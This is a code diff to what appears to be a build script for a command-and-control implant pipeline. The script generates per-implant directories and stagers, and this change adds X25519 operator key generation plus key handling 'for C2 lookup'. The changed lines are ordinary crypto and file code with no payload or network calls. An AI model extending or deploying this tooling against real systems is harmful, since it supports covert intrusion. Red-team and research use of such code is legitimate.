@@ -18,6 +18,8 @@ import uuid
 from pathlib import Path
 from typing import Any
 
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import x25519
 from rich.console import Console
 from rich.panel import Panel
 
@@ -27,6 +29,38 @@ console = Console()
 DIR: Path = Path(__file__).parent
 
 StepDef = dict[str, Any]
+
+
+def generate_keypair(instance_dir: Path) -> Path:
+    """Generate an X25519 keypair and save to the instance directory.
+
+    Returns the path to the public key file.
+    """
+    private_key = x25519.X25519PrivateKey.generate()
+    public_key = private_key.public_key()
+
+    priv_bytes = private_key.private_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PrivateFormat.Raw,
+        encryption_algorithm=serialization.NoEncryption(),
+    )
+    pub_bytes = public_key.public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw,
+    )
+
+    priv_path = instance_dir / "operator_private.bin"
+    pub_path = instance_dir / "operator_key.bin"
+    priv_path.write_bytes(priv_bytes)
+    pub_path.write_bytes(pub_bytes)
+
+    console.print(f"[dim]  Private key: {priv_path}[/]")
+    console.print(f"[dim]  Public key:  {pub_path}[/]")
+    console.print(
+        f"[dim]  Public key (b64): {base64.b64encode(pub_bytes).decode('ascii')}[/]"
+    )
+
+    return pub_path
 
 
 def _make_steps(instance_dir: Path) -> dict[str, StepDef]:
@@ -210,11 +244,12 @@ def assemble_stager(
         console.print(f"\n[bold red]FAILED[/] stager (exit code {result.returncode})")
         sys.exit(result.returncode)
 
-    # Copy operator public key into instance dir for C2 lookup
+    # Copy operator public key into instance dir for C2 lookup (skip if already there)
     if args.public_key:
-        pubkey_src = DIR / args.public_key
-        if pubkey_src.exists():
-            shutil.copy2(pubkey_src, instance_dir / pubkey_src.name)
+        pubkey_src = (DIR / args.public_key).resolve()
+        pubkey_dst = (instance_dir / pubkey_src.name).resolve()
+        if pubkey_src.exists() and pubkey_src != pubkey_dst:
+            shutil.copy2(pubkey_src, pubkey_dst)
 
     elapsed = time.time() - start
     console.print(f"\n[green]✓[/] stager completed in {format_duration(elapsed)}\n")
@@ -260,6 +295,14 @@ def main() -> None:
     instance_dir = DIR / "implants" / implant_id
     instance_dir.mkdir(parents=True, exist_ok=True)
 
+    # Generate or use existing operator keypair
+    if args.public_key:
+        console.print(f"[dim]Using existing key: {args.public_key}[/]")
+    else:
+        console.print("[bold]Generating X25519 operator keypair...[/]")
+        pub_path = generate_keypair(instance_dir)
+        args.public_key = str(pub_path.relative_to(DIR))
+
     steps_defs = _make_steps(instance_dir)
 
     console.print(
@@ -267,7 +310,8 @@ def main() -> None:
             f"[bold]C4 Protocol Pipeline (Encrypted Map Version)[/]\n"
             f"[dim]Implant ID:[/] {implant_id}\n"
             f"[dim]Instance:  [/] {instance_dir}\n"
-            f"[dim]Seed:      [/] {args.seed}",
+            f"[dim]Seed:      [/] {args.seed}\n"
+            f"[dim]Key:       [/] {args.public_key}",
             border_style="cyan",
         )
     )
